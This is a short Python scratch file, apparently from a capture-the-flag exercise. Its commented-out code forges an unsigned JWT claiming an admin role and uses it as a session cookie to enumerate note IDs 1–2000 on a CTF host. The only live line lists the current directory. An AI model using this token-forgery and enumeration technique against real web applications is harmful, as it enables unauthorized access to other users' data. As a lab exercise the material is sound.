# import jwt
# print(jwt.encode({"uid": 100,"role": "admin"}, key=None, algorithm=None))
# # print(jwt.decode('eyJ1aWQiOiAxMDAsICJyb2xlIjogInVzZXIifQ', algorithms='HS256'))
#eyJ1aWQiOjEwMCwicm9sZSI6ImFkbWluIn0
# import requests
# session = requests.session()
# url = 'https://ac8679bc-3fce-4b1e-b6d4-a9b4b75ace7b.ctf.ctfinf.ru/note/'
# for x in range(1, 2000):
#     gt = session.get(url + str(x), cookies={'session': 'eyJ1aWQiOjEwMCwicm9sZSI6ImFkbWluIn0'})
#     if gt.status_code != 404:
#         print('номер:', x)
import os
print(os.popen('ls').read())
